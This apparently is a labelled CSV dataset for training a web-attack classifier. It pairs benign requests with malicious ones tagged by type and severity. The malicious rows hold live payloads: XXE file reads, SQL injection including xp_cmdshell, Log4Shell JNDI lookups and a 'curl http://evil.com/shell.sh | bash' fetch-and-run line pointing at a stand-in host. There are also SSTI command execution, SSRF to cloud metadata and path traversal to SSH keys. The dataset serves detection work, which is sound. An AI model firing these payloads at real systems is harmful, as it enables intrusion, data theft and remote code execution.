text,label,attack_type,severity
%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E,1,xxe,high
Referer: http://target.com/?q=1'; DROP TABLE users--,1,sql_injection,high
"content-type: application/json
body: {{""name"":""green""}}",0,normal,none
"GET /search?input=${j${::-n}di:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=javascript:alert(document.cookie)",1,xss,medium
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20data%20[%3C!ELEMENT%20data%20ANY%3E%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Cdata%3E&file;%3C/data%3E,1,xxe,high
;%20whoami,1,command_injection,critical
"%27%20UNION%20SELECT%20NULL,NULL--",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\boot.ini",1,path_traversal,medium
User-Agent: ..\..\..\boot.ini,1,path_traversal,medium
"GET /search?input=%27%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /api/status?service=data-science,0,normal,none
GET /products/report-january HTTP/1.1,0,normal,none
GET /api/status?service=cameras,0,normal,none
X-Forwarded-For: | chmod +s /bin/bash,1,command_injection,critical
delete item id=javascript,0,normal,none
PUT /api/users/laptops/settings,0,normal,none
"GET /page?id=%3Cp%20onmouseover=%27alert%281%29%27%3Ehover%3C/p%3E HTTP/1.1
Host: target.com",1,xss,medium
login=admin&pass=admin,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=1%20OR%201=1/*",1,sql_injection,high
"GET /search?input=#set%28$x=%27%27%29#set%28$rt=$x.class.forName%28%27java.lang.Runtime%27%29%29#set%28$chr=$x.class.forName%28%27java.lang.Character%27%29%29#set%28$str=$x.class.forName%28%27java.lang.String%27%29%29#set%28$ex=$rt.getRuntime%28%29.exec%28%27id%27%29%29$ex.waitFor%28%29 HTTP/1.1
Host: target.com",1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%201=1#",1,sql_injection,high
GET /images/fr.png,0,normal,none
delete item id=green,0,normal,none
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///c:/windows/win.ini%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /search?input=../../../../etc/hosts HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: target.com",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=search=%27%20OR%201=1--&submit=Search",1,sql_injection,high
GET /users/faq/profile HTTP/1.1,0,normal,none
GET /docs/10.html,0,normal,none
GET /images/pdf.png,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://169.254.169.254/latest/user-data",1,ssrf,high
Referer: http://target.com/?q=%3Clink%20rel=import%20href=javascript:alert%281%29%3E,1,xss,medium
filter results by category=en,0,normal,none
Referer: http://target.com/?q=%0a cat /etc/passwd,1,command_injection,critical
"POST /api/orders body={{""item"":""1""}}",0,normal,none
User-Agent: username=admin&password=admin123,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=1%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",1,sql_injection,high
"GET /search?input=....\....\....\etc\passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=; curl http://evil.com/shell.sh | bash HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: {{[].__class__.__base__.__subclasses__%28%29}},1,ssti,high
username=admin&password=password,1,brute_force,low
${%22freemarker.template.utility.Execute%22?new%28%29%28%22id%22%29},1,ssti,high
User-Agent: <select onchange=alert(1)><option>1</option></select>,1,xss,medium
GET /blog/cameras HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cstyle%3E*{background:url%28%27javascript:alert%281%29%27%29}%3C/style%3E",1,xss,medium
sort items by smartphones ascending,0,normal,none
"GET /search?input=../../../../etc/hostname HTTP/1.1
Host: target.com",1,path_traversal,medium
id=1%27%20AND%20%271%27=%271,1,sql_injection,high
"GET /page?id=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/evil.dtd""> %xxe;]> HTTP/1.1
Host: target.com",1,xxe,high
User-Agent: 1;%20SELECT%20pg_sleep%285%29--,1,sql_injection,high
User-Agent: %3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,xss,medium
GET /category/mobile-apps/items,0,normal,none
%27%20HAVING%201=1--,1,sql_injection,high
GET /users/javascript/profile HTTP/1.1,0,normal,none
GET /users/price/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=${jndi:ldap://evil.com/${java:os}}",1,log4shell,critical
POST /api/cart add item=faq,0,normal,none
%27;%20UPDATE%20users%20SET%20password=%27hacked%27%20WHERE%20%271%27=%271%27--,1,sql_injection,high
"GET /page?id=1%20AND%20%28SELECT%20SUBSTRING%28username,1,1%29%20FROM%20users%20WHERE%20username=%27admin%27%29=%27a%27 HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=|%20ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
create new post title=report-january,0,normal,none
User-Agent: ${self.module.cache.util.os.system%28%27id%27%29},1,ssti,high
User-Agent: http://127.0.0.1:3306,1,ssrf,high
"GET /search?input=../../../../home/user/.ssh/id_rsa HTTP/1.1
Host: target.com",1,path_traversal,medium
download file web-development.pdf,0,normal,none
export report database,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Csvg%20onload=alert%28document.domain%29%3E",1,xss,medium
Referer: http://target.com/?q=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
edit comment id=ar,0,normal,none
download file laptops.pdf,0,normal,none
"POST /api/feedback body={{""message"":""es""}}",0,normal,none
%27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"GET /search?input=username=guest&password=guest HTTP/1.1
Host: target.com",1,brute_force,low
User-Agent: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,1,path_traversal,medium
"GET /page?id=Authorization: Basic YWRtaW46YWRtaW4= HTTP/1.1
Host: target.com",1,brute_force,low
Referer: http://target.com/?q=http://spoofed.burpcollaborator.net,1,ssrf,high
"GET /page?id=${self.module.cache.util.os.system%28%27id%27%29} HTTP/1.1
Host: target.com",1,ssti,high
%27%20OR%20SLEEP%285%29--,1,sql_injection,high
X-Forwarded-For: %27%20GROUP%20BY%201--,1,sql_injection,high
"GET /page?id=/etc/passwd%00.php HTTP/1.1
Host: target.com",1,path_traversal,medium
GET /category/electronics/items,0,normal,none
Referer: http://target.com/?q=expect://id,1,path_traversal,medium
"GET /page?id=${%22freemarker.template.utility.Execute%22?new%28%29%28%22id%22%29} HTTP/1.1
Host: target.com",1,ssti,high
%27%20UNION%20SELECT%20NULL--,1,sql_injection,high
X-Forwarded-For: ..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
delete item id=bob,0,normal,none
GET /docs/2024.html,0,normal,none
export report en,0,normal,none
${jndi:ldap://evil.%63om/a},1,log4shell,critical
Referer: http://target.com/?q={{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}},1,ssti,high
Referer: http://target.com/?q=%3Cbody%20onload=alert%281%29%3E,1,xss,medium
%7Cwhoami,1,command_injection,critical
Referer: http://target.com/?q=../../../../etc/hostname,1,path_traversal,medium
%27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
User-Agent: %3Caudio%20src=x%20onerror=alert%281%29%3E,1,xss,medium
X-Forwarded-For: ;%20cat%20/etc/passwd,1,command_injection,critical
GET /images/size.png,0,normal,none
POST /api/cart add item=javascript,0,normal,none
"GET /search?input=1' ORDER BY 10-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/feedback body={{""message"":""pdf""}}",0,normal,none
Referer: http://target.com/?q=javascript:alert%28document.cookie%29,1,xss,medium
"GET /page?id=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E HTTP/1.1
Host: target.com",1,xxe,high
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},1,ssti,high
"Referer: http://target.com/?q=<?xml version=""1.0""?><!DOCTYPE lolz [<!ENTITY lol ""lol""><!ENTITY lol9 ""&lol;&lol;&lol;"">]><foo>&lol9;</foo>",1,xxe,high
User-Agent: onmouseover=alert(1),1,xss,medium
X-Forwarded-For: ;%20crontab%20-l,1,command_injection,critical
GET /docs/2024.html,0,normal,none
search query for blue,0,normal,none
User-Agent: Authorization: Basic YWRtaW46YWRtaW4=,1,brute_force,low
User-Agent: ../../../../etc/hosts,1,path_traversal,medium
| uname -a,1,command_injection,critical
User-Agent: <IMG SRC=javascript:alert('XSS')>,1,xss,medium
"GET /search?input=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"Referer: http://target.com/?q=<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]><foo>&xxe;</foo>",1,xxe,high
X-Forwarded-For: ${7*7},1,ssti,high
X-Forwarded-For: search=%27%20OR%201=1--&submit=Search,1,sql_injection,high
User-Agent: %3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E,1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization: Basic cm9vdDpyb290",1,brute_force,low
delete item id=blue,0,normal,none
upload image photo_csv.jpg,0,normal,none
User-Agent: ' HAVING 1=1--,1,sql_injection,high
"GET /search?input=http://127.0.0.1/admin HTTP/1.1
Host: target.com",1,ssrf,high
"GET /search?input=1;%20EXEC%20xp_cmdshell%28%27dir%20c:\%27%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=`cat%20/etc/passwd` HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},1,ssti,high
"GET /page?id=username=hadoop&password=hadoop HTTP/1.1
Host: target.com",1,brute_force,low
edit comment id=25,0,normal,none
../../../etc/passwd,1,path_traversal,medium
"GET /search?input=%3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=<select onchange=alert(1)><option>1</option></select> HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E HTTP/1.1
Host: target.com",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20root%20[%3C!ENTITY%20test%20SYSTEM%20%22file:///etc/hostname%22%3E]%3E%3Croot%3E&test;%3C/root%3E",1,xxe,high
"GET /page?id=' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: username=admin&password=password123,1,brute_force,low
"GET /page?id=username=admin&password=admin HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=%3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E HTTP/1.1
Host: target.com",1,xxe,high
POST /api/cart add item=2024,0,normal,none
